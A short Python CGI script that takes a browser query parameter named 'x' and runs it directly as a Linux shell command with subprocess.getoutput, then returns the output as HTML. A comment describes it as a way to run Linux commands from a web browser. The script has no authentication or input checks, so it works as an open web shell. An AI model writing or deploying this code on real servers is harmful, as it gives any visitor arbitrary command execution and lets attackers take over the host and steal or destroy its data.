#!/usr/bin/python3

import  cgi,subprocess
import cgitb

print("Content-Type: text/html")
print("")

webdata=cgi.FieldStorage()

y1=webdata.getvalue('x')

result=subprocess.getoutput(y1)  # //To run linux command in web browser.//

print("<pre>")
print(result)
print("</pre>")
